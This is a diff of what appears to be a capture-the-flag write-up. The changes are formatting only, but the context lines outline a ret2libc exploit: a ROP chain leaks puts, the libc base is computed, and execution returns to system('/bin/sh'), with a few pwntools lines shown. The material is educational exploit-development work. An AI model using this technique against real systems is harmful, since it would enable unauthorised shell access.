@@ -61,7 +61,7 @@ As you can see the program is rather straightforward.
 2. The length of the v4 string is then compared with **0xA**. If `strlen(v4) > 0xA`, the program exits immediately.
 3. Else, the program uses an **if** operator, and has 2 outcomes. Both of which returns to main().
 
-<br>
+<br><br>
 
 ## Exploitation Ideas
 ---
@@ -84,7 +84,7 @@ The logic of the exploit will go like this.
 4. With the LIBC on the remote server, we can calculate the address of **system()**.
 5. Return to LIBC system('/bin/sh\x00')
 
-<br>
+<br><br>
 
 ## Exploitation
 ---
@@ -140,8 +140,8 @@ p.sendline(payload + rop.chain())
 
 p.recvuntil(b"Sorry, we don't sell water...")
 p.recvline()
-puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')) # puts leak
-#printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00')) # printf leak
+puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))        # puts leak
+#printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))     # printf leak
 
 libc.address = puts - libc.sym.puts
 
